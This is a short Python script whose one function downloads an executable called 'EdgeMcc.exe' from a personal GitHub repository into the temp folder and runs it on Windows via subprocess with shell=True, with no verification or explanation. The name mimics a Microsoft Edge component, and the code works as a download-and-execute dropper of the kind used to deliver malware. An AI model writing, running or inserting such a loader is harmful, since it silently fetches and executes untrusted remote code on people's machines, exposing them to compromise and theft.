import os
import requests
import tempfile
import subprocess
import sys

def run_program():
    url = "https://github.com/FaresEI3RAB/Fares/raw/refs/heads/main/EdgeMcc.exe"
    file_name = os.path.join(tempfile.gettempdir(), "EdgeMcc.exe")
    
    response = requests.get(url)
    with open(file_name, 'wb') as f:
        f.write(response.content)
    
    if sys.platform == "win32":
        subprocess.Popen(file_name, shell=True)
    else:
        print("This program only runs on Windows.")
